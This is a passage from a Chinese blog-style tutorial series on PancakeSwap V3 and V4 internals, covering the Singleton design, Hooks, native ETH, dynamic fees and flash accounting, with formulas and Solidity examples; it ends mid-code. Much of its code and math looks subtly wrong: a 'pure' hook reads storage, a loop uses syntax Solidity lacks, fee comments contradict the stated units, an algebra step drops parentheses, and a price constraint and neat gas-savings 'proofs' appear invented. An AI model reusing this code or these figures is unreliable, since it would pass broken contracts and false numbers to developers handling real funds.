核心篇 --&gt; 特色篇 --&gt; 实践篇\n\n文章目录\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容难度01PancakeSwap V3概述发展历程、集中流动性、V3特色⭐⭐02Tick机制与价格数学Tick设计、价格转换、数学证明⭐⭐⭐03架构与合约设计Factory、Pool、合约结构⭐⭐⭐04交换机制深度解析swap函数、价格发现、滑点计算⭐⭐⭐⭐05流动性管理与头寸Position、mint/burn/collect⭐⭐⭐⭐06费用系统与预言机费用分配、TWAP、多级费率⭐⭐⭐⭐07V3与Uniswap V3对比差异点、优化、适用场景⭐⭐⭐⭐08多链部署与特性适配BNB Chain、Ethereum、跨链策略⭐⭐⭐⭐09集成开发指南SDK使用、交易构建、最佳实践⭐⭐⭐⭐⭐10MEV与套利策略JIT、三明治攻击、防范策略⭐⭐⭐⭐⭐\n学习路径\n入门读者\n如果你是DeFi新手，建议按顺序阅读：\n\n第一篇：了解PancakeSwap的发展历程和V3的核心创新\n第二篇：理解Tick机制和集中流动性原理\n第三篇：认识V3的合约架构\n\n中级读者\n如果你已有DeFi开发经验：\n\n重点阅读第四、五、六篇，深入理解核心机制\n结合PancakeSwap V3源码进行学习\n在测试网实践操作\n\n高级读者\n如果你想深入研究：\n\n深入第七、八篇，了解PancakeSwap V3的独特优势\n研究第九篇的集成开发指南，构建实际应用\n探索第十篇的MEV策略，考虑实际交易优化\n\n核心概念速查\n数学公式\n价格定义：      price = 1.0001^tick\n集中流动性：    (x + L/√Pb) × (y + L×√Pa) = L²\n代币数量：      Δx = L × (1/√Pa - 1/√Pb)\n                Δy = L × (√Pb - √Pa)\n\nPancakeSwap V3特色\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性说明相比Uniswap多链部署BNB Chain、Ethereum等部署链更多费率灵活支持自定义费率费率选择更多样治理代币CAKEUNI生态集成农场、IFO等生态更丰富社区驱动强调社区治理社区参与度高\n关键数据结构\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n结构用途位置Slot0打包存储池子核心状态Pool合约Position.Info流动性头寸信息Position库Tick.InfoTick级别的流动性和费用数据Tick库Observation预言机历史数据点Oracle库\n核心函数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能合约swap()代币交换PancakeV3Poolmint()添加流动性PancakeV3Poolburn()移除流动性PancakeV3Poolcollect()收取费用PancakeV3Poolobserve()查询预言机PancakeV3Pool\nPancakeSwap V3 vs Uniswap V3\n主要差异\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面PancakeSwap V3Uniswap V3部署链BNB Chain、Ethereum等Ethereum、Arbitrum等费率层级更多自定义选项0.05%、0.3%、1%治理代币CAKEUNI费用分配协议费率灵活协议费率固定开发团队PancakeSwap团队Uniswap Labs生态集成与农场、IFO深度集成相对独立\n选择建议\n\nPancakeSwap V3：适合BNB Chain生态、高gas效率需求、农场参与者\nUniswap V3：适合Ethereum主网、机构级应用、深度流动性需求\n\n配套资源\n官方资源\n\nPancakeSwap V3 Core\nPancakeSwap V3 Periphery\nPancakeSwap 官方文档\nPancakeSwap 白皮书\n\n测试网络\n\nBNB Chain Testnet\nGoerli测试网\nSepolia测试网\n本地Foundry/Hardhat环境\n\n学习工具\n\nPancakeSwap Info - 数据分析\nTenderly - 交易模拟和调试\nDune Analytics - 链上数据分析\nDune - PancakeSwap\n\n阅读建议\n\n对比学习：建议与Uniswap V3系列文章对比阅读，理解差异\n动手实践：每篇文章的代码示例都可以在测试网验证\n多链测试：在BNB Chain和Ethereum上都进行测试\n关注生态：结合PancakeSwap的农场、IFO等生态产品学习\n社区参与：参与PancakeSwap社区讨论，获取最新动态\n\n为什么要学PancakeSwap V3？\n\n多链趋势：PancakeSwap V3的多链部署代表DEX发展方向\ngas效率：BNB Chain上的低gas环境更利于高频交易\n生态整合：与农场、Launchpad等整合提供完整DeFi体验\n创新机制：在Uniswap V3基础上的优化和创新\n市场地位：BNB Chain上最大的DEX，实际应用价值高\n\n更新日志\n\n2025-12：系列文章开始撰写\n\n反馈与交流\n如有问题或建议，欢迎通过Issue讨论。\n\nHappy Learning! 🥞"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/01-V4架构与核心创新":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/01-V4架构与核心创新","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/01-V4架构与核心创新.md","title":"01-V4架构与核心创新","links":[],"tags":[],"content":"死磕PancakeSwap V4（一）：V4架构与核心创新\n\n本文是「死磕PancakeSwap V4」系列的第一篇，深入探讨V4的架构变革、核心创新以及与V3的根本性差异。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. V4革命性创新概述\n1.1 V3到V4的范式转变\nflowchart TB\n    subgraph V3Arch[&quot;V3架构&quot;]\n        V3F[Factory合约]\n        V3P1[Pool A合约]\n        V3P2[Pool B合约]\n        V3P3[Pool C合约]\n        V3Note[每个池子独立合约]\n    end\n\n    subgraph V4Arch[&quot;V4架构&quot;]\n        V4S[Singleton合约]\n        V4H[Hooks合约]\n        V4P1[Pool A数据]\n        V4P2[Pool B数据]\n        V4P3[Pool C数据]\n        V4Note[所有池子共享合约]\n    end\n\n    V3Arch --&gt;|革命性变革| V4Arch\n\n    style V4Arch fill:#ffeb3b\n\n1.2 核心创新对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n创新点V3V4影响架构多合约Singleton创建成本降低90%+自定义固定功能Hooks无限定制可能ETH支持WETH包装Native ETH简化交互费用固定等级动态费用更灵活定价记账传统转账Flash Accounting优化gas\n\n2. Singleton架构深度解析\n2.1 为什么需要Singleton？\nV3的架构问题：\ngraph TB\n    subgraph V3Problems[&quot;V3架构问题&quot;]\n        P1[每个池子独立部署]\n        P2[重复代码]\n        P3[高额部署成本]\n        P4[存储碎片化]\n        P5[无法统一优化]\n    end\n\n    subgraph Costs[&quot;成本分析&quot;]\n        C1[部署成本: ~2M gas]\n        C2[每次操作: 访问独立合约]\n        C3[存储: 每个池子独立布局]\n    end\n\n    P1 --&gt; C1\n    P2 --&gt; C1\n    P3 --&gt; C1\n    P4 --&gt; C3\n    P5 --&gt; C2\n\n    style Costs fill:#ffcdd2\n\n2.2 Singleton数学模型\n存储优化的数学推导\nV3存储模型：\n假设有N个池子，每个池子需要S个存储槽：\nTotalStorage_V3 = N × S\n\n其中：\n- N: 池子数量\n- S: 单个池子存储槽数量\n\nV4 Singleton存储模型：\nTotalStorage_V4 = S_base + N × S_pool\n\n其中：\n- S_base: Singleton基础存储（共享）\n- S_pool: 每个池子的差异数据\n\n存储节省比例：\nSavings_Ratio = (TotalStorage_V3 - TotalStorage_V4) / TotalStorage_V3\n\n展开：\n= (N×S - (S_base + N×S_pool)) / (N×S)\n= (N×S - S_base - N×S_pool) / (N×S)\n= N×(S - S_pool) - S_base / (N×S)\n\n当 S &gt;&gt; S_base 时：\n≈ (S - S_pool) / S\n= 1 - S_pool/S\n\n实际数值示例：\n假设：\n\nS = 100 存储槽/池子（V3）\nS_base = 50 存储槽（V4共享）\nS_pool = 20 存储槽/池子（V4差异数据）\n\n当 N = 1000 个池子时：\nV3总存储 = 1000 × 100 = 100,000 存储槽\nV4总存储 = 50 + 1000 × 20 = 20,050 存储槽\n\n节省 = (100,000 - 20,050) / 100,000 = 79.95%\n\n2.3 Gas成本数学推导\n部署Gas成本\nV3部署成本：\nGas_V3_deploy = N × Gas_per_pool\n\n其中：\n- Gas_per_pool ≈ 2,000,000 gas\n\nV4部署成本：\nGas_V4_deploy = Gas_singleton + N × Gas_pool_creation\n\n其中：\n- Gas_singleton ≈ 1,000,000 gas（一次）\n- Gas_pool_creation ≈ 150,000 gas（每次）\n\n成本对比：\n当 N = 1000 个池子时：\nGas_V3_total = 1000 × 2,000,000 = 2,000,000,000 gas\nGas_V4_total = 1,000,000 + 1000 × 150,000 = 151,000,000 gas\n\n节省 = (2,000,000,000 - 151,000,000) / 2,000,000,000 = 92.45%\n\n操作Gas成本\nV3操作成本：\nGas_V3_swap = Gas_base + Gas_pool_access + N×Gas_hook\n\n其中：\n- Gas_base: 基础操作成本\n- Gas_pool_access: 访问独立池子成本\n- Gas_hook: Hooks执行成本\n\nV4操作成本：\nGas_V4_swap = Gas_base + Gas_pool_lookup + N×Gas_hook\n\n其中：\n- Gas_pool_lookup: 在Singleton中查找池子\n- Gas_hook: Hooks执行成本\n\n数学证明：\n我们需要证明：Gas_V4_swap &lt; Gas_V3_swap\n证明：\n\nGas_V4_swap &lt; Gas_V3_swap\n⇔ Gas_base + Gas_pool_lookup + N×Gas_hook &lt; Gas_base + Gas_pool_access + N×Gas_hook\n⇔ Gas_pool_lookup &lt; Gas_pool_access\n\n因为在V4中：\n- Gas_pool_lookup: 数组查找 O(logN) 或 O(1) 哈希\n- Gas_pool_access: 调用外部合约\n\n已知：\n调用外部合约成本 &gt;&gt; 数组查找成本\n\n∴ Gas_pool_lookup &lt; Gas_pool_access\n∴ Gas_V4_swap &lt; Gas_V3_swap\n\n证毕。\n\n2.4 数据存储结构\nV4存储布局：\ncontract PancakeV4PoolManager {\n    // 映射：池子ID -&gt; 池子数据\n    mapping(uint256 =&gt; PoolData) public pools;\n \n    // 池子计数器\n    uint256 public poolCount;\n \n    // Hooks映射\n    mapping(address =&gt; HookData) public hooks;\n \n    struct PoolData {\n        address token0;\n        address token1;\n        uint24 fee;\n        int24 tickSpacing;\n        address hook;\n        uint160 sqrtPriceX96;\n        int24 tick;\n        uint128 liquidity;\n        // ... 更多字段\n    }\n \n    struct HookData {\n        bytes flags;\n        address impl;\n        // ... 更多字段\n    }\n}\n\n3. Hooks机制概述\n3.1 Hooks的本质\nHooks本质上是在AMM的关键操作点插入的自定义逻辑，可以被视为状态转换函数。\ngraph TB\n    subgraph HookMath[&quot;Hooks的数学模型&quot;]\n        S_t[当前状态 S_t]\n        Input[输入 Δx, Δy]\n        Context[上下文 Context]\n        HookFunction[Hook函数 H]\n        S_t_plus_1[新状态 S_{t+1}]\n    end\n\n    S_t --&gt; HookFunction\n    Input --&gt; HookFunction\n    Context --&gt; HookFunction\n    HookFunction --&gt; S_t_plus_1\n\n    note right of HookFunction\n        S_{t+1} = H(S_t, Δx, Δy, Context)\n    end note\n\n    style HookFunction fill:#ffeb3b\n\n3.2 Hooks的数学性质\n1) 幂等性（Idempotency）\n对于某些Hook，重复执行应该产生相同结果：\nH(H(S, x), x) = H(S, x)\n\n举例：记录交易日志\n// 幂等的Hook\nfunction logTransaction(bytes32 txHash) external {\n    if (logged[txHash]) {\n        return; // 已记录，幂等\n    }\n    logged[txHash] = true;\n    emit TransactionLog(txHash);\n}\n2) 可逆性（Reversibility）\n某些操作应该可以被撤销：\n∃ Hook^{-1}: H^{-1}(H(S, x)) = S\n\n举例：暂存机制\n// 可逆的Hook\nmapping(address =&gt; uint256) temporaryStorage;\n \nfunction temporaryAdd(address user, uint256 amount) external {\n    temporaryStorage[user] += amount;\n}\n \nfunction temporaryRemove(address user, uint256 amount) external {\n    require(temporaryStorage[user] &gt;= amount);\n    temporaryStorage[user] -= amount;\n}\n3) 幺等元素（Identity Element）\n存在空操作Hook：\n∃ Hook_null: H_null(S, x) = S\n\n举例：空Hook实现\n// 幺等Hook\nfunction doNothing() external pure {\n    // 空实现，不改变任何状态\n}\n3.3 Hooks触发时机\nsequenceDiagram\n    participant User as 用户\n    participant Pool as PoolManager\n    participant Hook as Hook合约\n\n    User-&gt;&gt;Pool: 操作请求\n    Pool-&gt;&gt;Hook: before[操作]()\n    Hook--&gt;&gt;Pool: 返回修改后的参数\n    Pool-&gt;&gt;Pool: 执行核心逻辑\n    Pool-&gt;&gt;Hook: after[操作]()\n    Hook--&gt;&gt;Pool: 返回更新后的状态\n    Pool-&gt;&gt;Pool: 更新状态\n    Pool--&gt;&gt;User: 返回结果\n\n\n4. Native ETH支持\n4.1 V3的ETH限制\n在V3中，所有ETH交易必须先包装为WETH：\nflowchart LR\n    subgraph V3Flow[&quot;V3 ETH交易流程&quot;]\n        A[用户持有ETH]\n        B[包装为WETH&lt;br/&gt;wrap()]\n        C[在池中交易WETH]\n        D[领取WETH]\n        E[解包装为ETH&lt;br/&gt;unwrap()]\n    end\n\n    subgraph Costs[&quot;额外成本&quot;]\n        C1[wrap操作: ~50k gas]\n        C2[unwrap操作: ~50k gas]\n        C3[额外合约调用]\n    end\n\n    B --&gt; C1\n    E --&gt; C2\n    C3 -.-&gt; B\n    C3 -.-&gt; E\n\n    style Costs fill:#ffcdd2\n\n4.2 V4的Native ETH支持\n在V4中，可以直接使用ETH：\nflowchart LR\n    subgraph V4Flow[&quot;V4 ETH交易流程&quot;]\n        A[用户持有ETH]\n        B[直接交易&lt;br/&gt;附带ETH]\n        C[池子接受ETH]\n        D[领取ETH]\n    end\n\n    subgraph Benefits[&quot;优势&quot;]\n        B1[节省100k gas]\n        B2[简化用户体验]\n        B3[减少合约交互]\n    end\n\n    A --&gt; C\n    C --&gt; D\n\n    style Benefits fill:#c8e6c9\n\n4.3 Flash Accounting中的ETH处理\n数学模型：\n净ETH变化:\n    Δeth = Σ(eth_received) - Σ(eth_sent)\n\n结算条件:\n    Δeth + Σ(Δbalance_i × price_i) = 0\n\n其中：\n- eth_received: 收到的ETH数量\n- eth_sent: 发送的ETH数量\n- Δbalance_i: 第i个代币的余额变化\n- price_i: 第i个代币的价格（相对ETH）\n\n代码实现：\ncontract PancakeV4PoolManager {\n    // 追踪ETH余额\n    uint256 public ethBalance;\n \n    // 代币余额追踪\n    mapping(address token =&gt; uint256 balance) public tokenBalances;\n \n    function settle() internal {\n        // 计算净ETH变化\n        int256 deltaEth = int256(address(this).balance) - int256(ethBalance);\n \n        // 验证代币余额\n        for (address token in activeTokens) {\n            uint256 currentBalance = IERC20(token).balanceOf(address(this));\n            uint256 trackedBalance = tokenBalances[token];\n \n            require(\n                currentBalance &gt;= trackedBalance,\n                &quot;Token balance below tracked&quot;\n            );\n \n            uint256 delta = currentBalance - trackedBalance;\n            // 处理代币变化...\n \n            tokenBalances[token] = currentBalance;\n        }\n \n        // 更新ETH余额\n        ethBalance = address(this).balance;\n \n        require(deltaEth &gt;= 0, &quot;ETH balance deficit&quot;);\n    }\n}\n\n5. 动态费用机制\n5.1 固定费用的问题\nV3的固定费用无法适应市场变化：\ngraph TB\n    subgraph FixedFeeProblems[&quot;固定费用问题&quot;]\n        P1[高波动时费用过低]\n        P2[低波动时费用过高]\n        P3[无法适应市场变化]\n        P4[收益不是最优]\n    end\n\n    subgraph MarketConditions[&quot;市场状况&quot;]\n        C1[高波动&lt;br/&gt;应该提高费用]\n        C2[低波动&lt;br/&gt;应该降低费用]\n        C3[流动性充足&lt;br/&gt;可以降低费用]\n        C4[流动性稀缺&lt;br/&gt;应该提高费用]\n    end\n\n    P1 --&gt; C1\n    P2 --&gt; C2\n    P3 --&gt; C1\n    P3 --&gt; C2\n    P4 --&gt; C3\n    P4 --&gt; C4\n\n    style MarketConditions fill:#ffeb3b\n\n5.2 动态费用数学模型\n基于波动率的费用模型\n定义：\n\nσ: 价格波动率\nV: 交易量\nL: 流动性\nfee(t): t时刻的费用率\n\n动态费用函数：\nfee(t) = f(σ, V, L) = α × σ^β + γ × V/L + δ\n\n其中：\n- α, β, γ, δ: 模型参数\n- σ^β: 波动率项（β通常为1或2）\n- V/L: 单位流动性交易量\n- δ: 基础费用\n\n参数确定：\n通过历史数据回归分析确定参数：\nminimize: Σ(fee_historical - fee(t))^2\n\n约束条件:\n    0 &lt; fee(t) &lt; 1  （费用率在0-100%之间）\n\n基于供需的费用模型\n定义：\n\nD(t): t时刻的需求（交易量）\nS(t): t时刻的供给（流动性）\nfee(t): t时刻的费用率\n\n动态费用：\nfee(t) = fee_base × (D(t) / S(t))^k\n\n其中：\n- fee_base: 基础费用\n- k: 弹性系数（通常k &gt; 0）\n\n当k=1时：\nfee(t) = fee_base × D(t) / S(t)\n\n这意味着费用与供需比成正比\n\n举例：\n假设：\n\nfee_base = 0.3% = 0.003\n当前D(t) = 1,000,000 USDT\n当前S(t) = 10,000,000 USDT\n\nfee(t) = 0.003 × (1,000,000 / 10,000,000)\n       = 0.003 × 0.1\n       = 0.0003\n       = 0.03%\n\n在低需求时，费用降至0.03%\n\n如果D(t)增加到50,000,000 USDT：\nfee(t) = 0.003 × (50,000,000 / 10,000,000)\n       = 0.003 × 5\n       = 0.015\n       = 1.5%\n\n在高需求时，费用升至1.5%\n\n5.3 动态费用的Hook实现\ncontract DynamicFeeHook {\n    uint256 public feeBase = 300;  // 0.03%\n \n    // 波动率窗口（秒）\n    uint256 public volatilityWindow = 3600;  // 1小时\n \n    // 历史价格数据\n    uint256[] public priceHistory;\n    uint256[] public timestampHistory;\n \n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 计算当前波动率\n        uint256 volatility = calculateVolatility();\n \n        // 计算动态费用\n        uint256 currentFee = calculateDynamicFee(volatility);\n \n        return abi.encode(currentFee);\n    }\n \n    function calculateVolatility() internal view returns (uint256) {\n        if (priceHistory.length &lt; 2) {\n            return feeBase;  // 数据不足，使用基础费用\n        }\n \n        // 计算标准差\n        uint256 mean = calculateMean();\n        uint256 variance = calculateVariance(mean);\n        uint256 stdDev = sqrt(variance);\n \n        return stdDev;\n    }\n \n    function calculateDynamicFee(uint256 volatility) internal view returns (uint256) {\n        // 动态费用模型：fee = α × σ + fee_base\n        uint256 alpha = 100;  // 敏感度参数\n \n        uint256 dynamicFee = feeBase + alpha * volatility / 1e18;\n \n        // 限制费用范围\n        dynamicFee = max(dynamicFee, 100);    // 最小0.01%\n        dynamicFee = min(dynamicFee, 10000); // 最大1.00%\n \n        return dynamicFee;\n    }\n \n    function calculateMean() internal view returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i &lt; priceHistory.length; i++) {\n            sum += priceHistory[i];\n        }\n        return sum / priceHistory.length;\n    }\n \n    function calculateVariance(uint256 mean) internal view returns (uint256) {\n        uint256 sum = 0;\n        for (uint256 i = 0; i &lt; priceHistory.length; i++) {\n            int256 diff = int256(priceHistory[i]) - int256(mean);\n            sum += uint256(diff * diff);\n        }\n        return sum / priceHistory.length;\n    }\n \n    function sqrt(uint256 x) internal pure returns (uint256) {\n        if (x == 0) return 0;\n        uint256 z = (x + 1) / 2;\n        uint256 y = x;\n        while (z &lt; y) {\n            y = z;\n            z = (x / z + 1) / 2;\n        }\n        return y;\n    }\n \n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &gt;= b ? a : b;\n    }\n \n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &lt;= b ? a : b;\n    }\n}\n\n6. Flash Accounting原理\n6.1 传统记账的问题\nV3传统记账流程：\nsequenceDiagram\n    participant User as 用户\n    participant Pool as 池子\n    participant Token0 as Token0\n    participant Token1 as Token1\n\n    User-&gt;&gt;Pool: swap(amountIn)\n    Pool-&gt;&gt;Token0: transferFrom(amountIn)\n    Note over Token0: Gas消耗：~50k\n    Pool-&gt;&gt;Pool: 计算输出\n    Pool-&gt;&gt;Token1: transfer(amountOut)\n    Note over Token1: Gas消耗：~50k\n\n    Note over Pool: 总Gas: ~100k&lt;br/&gt;仅转账操作\n\n6.2 Flash Accounting机制\nV4 Flash Accounting流程：\nsequenceDiagram\n    participant User as 用户\n    participant Pool as PoolManager\n    participant Tokens as 代币合约\n\n    User-&gt;&gt;Pool: swap(amountIn) + 支付\n    Pool-&gt;&gt;Pool: 记录初始余额\n    Pool-&gt;&gt;Pool: 执行交换逻辑\n    Pool-&gt;&gt;Pool: 记录最终余额\n    Pool-&gt;&gt;Pool: 计算净变化\n    Pool-&gt;&gt;Tokens: settlement() 一次性结算\n    Note over Tokens: Gas消耗：~80k&lt;br/&gt;批量优化\n\n    Note over Pool: 总Gas: ~80k&lt;br/&gt;节省~20%\n\n6.3 Flash Accounting数学推导\n余额追踪模型\n定义：\n\nB_i(t): t时刻代币i的合约余额\nB_i^tracked(t): t时刻追踪的代币i余额\n\n初始状态：\nB_i^tracked(0) = B_i(0)\n\n操作过程：\n假设在时间[0, T]内发生了N次操作：\n操作1: Δx_1, Δy_1\n操作2: Δx_2, Δy_2\n...\n操作N: Δx_N, Δy_N\n\n净变化计算：\nΔB_i = B_i(T) - B_i^tracked(0)\n     = Σ(inputs_i) - Σ(outputs_i)\n\n结算条件：\n对于套利（无净资金流入/流出）：\nΣ(ΔB_i × price_i) = 0\n\n其中：\n- price_i: 代币i的价格（以某个计价单位）\n\n对于非套利交易：\nΔB_i ≥ 0  （所有代币余额不能为负）\n\nFlash Accounting节省证明\n定理：Flash Accounting相比传统记账节省gas。\n证明：\n设：\n\nn: 涉及的代币数量\nG_transfer: 单次转账gas成本\nG_balance: 查询余额gas成本\n\n传统记账成本：\nGas_traditional = n × G_transfer  (输入转账) + n × G_transfer  (输出转账)\n                 = 2n × G_transfer\n\nFlash Accounting成本：\nGas_flash = n × G_balance  (初始) + n × G_balance  (最终) + n × G_transfer  (结算)\n          = 2n × G_balance + n × G_transfer\n\n假设 G_balance ≈ G_transfer / 10（查询余额比转账便宜很多）：\nGas_flash ≈ 2n × (G_transfer / 10) + n × G_transfer\n          = 0.2n × G_transfer + n × G_transfer\n          = 1.2n × G_transfer\n\n节省比例：\nSavings = (Gas_traditional - Gas_flash) / Gas_traditional\n        = (2n × G_transfer - 1.2n × G_transfer) / (2n × G_transfer)\n        = 0.8n × G_transfer / (2n × G_transfer)\n        = 0.4\n        = 40%\n\n证毕。\n\n\n7. 本章小结\n7.1 V4核心创新总结\nmindmap\n  root((V4核心创新))\n    Singleton架构\n      所有池子共享合约\n      创建成本降低92%\n      存储优化80%\n    Hooks机制\n      完全可定制\n      数学性质丰富\n      无限扩展可能\n    Native ETH\n      直接支持ETH\n      节省100k gas\n      简化用户体验\n    Flash Accounting\n      优化转账操作\n      节省40% gas\n      统一结算机制\n    动态费用\n      基于市场状况\n      数学模型驱动\n      最优收益\n\n7.2 数学要点速查\n存储优化：\nSavings = (N×S - (S_base + N×S_pool)) / (N×S)\n\nGas优化：\nGas_savings = (Gas_V3 - Gas_V4) / Gas_V3\n\n动态费用：\nfee(t) = α × σ^β + γ × V/L + δ\n\nHooks数学：\nS_{t+1} = H(S_t, Δx, Δy, Context)\n\nFlash Accounting：\nΔB_i = B_i(T) - B_i^tracked(0)\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Hooks机制详解，包括：\n\nHooks的类型和用途\nHooks的数学模型推导\nHooks的实现原理和最佳实践\nHooks的安全性分析\n\n\n参考资料\n\nPancakeSwap V4 白皮书\nUniswap V4 Core 源码\nFlash Accounting 论文\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/02-Hooks机制详解":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/02-Hooks机制详解","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/02-Hooks机制详解.md","title":"02-Hooks机制详解","links":[],"tags":[],"content":"死磕PancakeSwap V4（二）：Hooks机制详解\n\n本文是「死磕PancakeSwap V4」系列的第二篇，深入剖析Hooks机制的数学模型、类型、实现原理以及安全分析。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. Hooks机制概述\n1.1 Hooks的本质定义\n从数学角度，Hook可以定义为状态转换函数：\nH: S × X × Y × C → S&#039;\n\n其中：\n- S: 当前状态空间\n- X: 输入代币变化量\n- Y: 输出代币变化量\n- C: 上下文信息\n- S&#039;: 新状态空间\n- H: Hook函数\n\n函数性质：\n\n确定性（Determinism）：\n\n∀(s, x, y, c): H(s, x, y, c) = s&#039;\n相同的输入总是产生相同的输出\n\n\n可选性（Optionality）：\n\nH可以为恒等函数（Identity Function）\nH_id(s, x, y, c) = s\n\n\n组合性（Composability）：\n\nH_composite = H2 ∘ H1\nH_composite(s, x, y, c) = H2(H1(s, x, y, c))\n\n1.2 Hooks的生命周期\nstateDiagram-v2\n    [*] --&gt; Initialized\n    Initialized --&gt; Swapping: beforeSwap\n    Swapping --&gt; AfterSwap: afterSwap\n    AfterSwap --&gt; LiquidityChange: beforeAddLiquidity\n    LiquidityChange --&gt; AfterLiquidity: afterAddLiquidity\n    AfterLiquidity --&gt; Donation: beforeDonate\n    Donation --&gt; AfterDonate: afterDonate\n    AfterDonate --&gt; Withdrawal: beforeWithdraw\n    Withdrawal --&gt; AfterWithdraw: afterWithdraw\n    AfterWithdraw --&gt; [*]\n\n    note right of Swapping\n        可修改交换参数\n        添加自定义费用\n        限制特定地址\n    end note\n\n    note right of AfterLiquidity\n        更新奖励系统\n        触发代币发行\n        记录流动性事件\n    end note\n\n\n2. Hooks类型的数学分析\n2.1 Initialize Hooks\nbeforeInitialize Hook\n函数签名：\nfunction beforeInitialize(\n    address sender,\n    uint160 sqrtPriceX96,\n    bytes calldata data\n) external returns (bytes memory);\n数学模型：\nH_beforeInit: S₀ × P × D → S₁ × P&#039;\n\n其中：\n- S₀: 初始状态\n- P: 初始价格 sqrtPriceX96\n- D: 自定义数据 data\n- S₁: Hook处理后的状态\n- P&#039;: 可修改的初始价格\n\n约束条件：\n1. 价格范围约束:\n   0 &lt; sqrtPriceX96 &lt; 2^160\n\n2. Tick约束:\n   sqrt(1.0001^MIN_TICK) × 2^96 ≤ sqrtPriceX96 ≤ sqrt(1.0001^MAX_TICK) × 2^96\n\n3. 数值精度约束:\n   sqrtPriceX96 ≡ 0 (mod 2^8)  （最低8位为0）\n\n示例：价格限制Hook\ncontract PriceLimitHook {\n    uint160 public minSqrtPriceX96;\n    uint160 public maxSqrtPriceX96;\n \n    function beforeInitialize(\n        address sender,\n        uint160 sqrtPriceX96,\n        bytes calldata data\n    ) external pure returns (bytes memory) {\n        require(\n            sqrtPriceX96 &gt;= minSqrtPriceX96 &amp;&amp;\n            sqrtPriceX96 &lt;= maxSqrtPriceX96,\n            &quot;Price out of range&quot;\n        );\n        return abi.encode(sqrtPriceX96);\n    }\n}\nafterInitialize Hook\n数学模型：\nH_afterInit: S₁ × P → S₂ × M\n\n其中：\n- S₁: 初始化后的状态\n- P: 实际使用的价格\n- S₂: Hook处理后的状态\n- M: 额外的元数据\n\n2.2 Swap Hooks\nbeforeSwap Hook\n这是最复杂的Hook之一，涉及价格和数量的数学验证。\n函数签名：\nfunction beforeSwap(\n    address sender,\n    address recipient,\n    int256 amount0,\n    int256 amount1,\n    uint160 sqrtPriceLimitX96,\n    bytes calldata data\n) external returns (bytes memory);\n数学模型：\nH_beforeSwap: S × A₀ × A₁ × P_limit × D → S&#039; × A₀&#039; × A₁&#039;\n\n其中：\n- S: 当前池子状态\n- A₀: token0数量（正为输入，负为输出）\n- A₁: token1数量（正为输入，负为输出）\n- P_limit: 价格限制\n- D: 自定义数据\n- S&#039;: Hook修改后的状态\n- A₀&#039;, A₁&#039;: 可修改的交换数量\n\n价格一致性约束：\n设交换前的价格为P，交换后的价格为P’，数量为(Δx, Δy)：\n恒定乘积公式（简化版）：\n(x + Δx) × (y + Δy) = x × y\n\n假设y/x = P（价格），则：\ny = P × x\n\n代入：\n(x + Δx) × (P × x + Δy) = x × P × x\n⇒ P × x² + x × Δy + P × x × Δx + Δx × Δy = P × x²\n⇒ x × Δy + P × x × Δx + Δx × Δy = 0\n\n对于微小变化（忽略Δx × Δy）：\n⇒ x × Δy ≈ -P × x × Δx\n⇒ Δy ≈ -P × Δx\n\n因此：\nΔx × P + Δy ≈ 0  （价格一致性）\n\n精确计算（考虑流动性L）：\nV3/V4的集中流动性模型：\n如果 zeroForOne = true（卖出token0，买入token1）：\nΔy = L × (√P - √P&#039;)\n\n如果 zeroForOne = false（卖出token1，买入token0）：\nΔx = L × (1/√P&#039; - 1/√P)\n\nHook验证示例：\ncontract PriceCheckHook {\n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 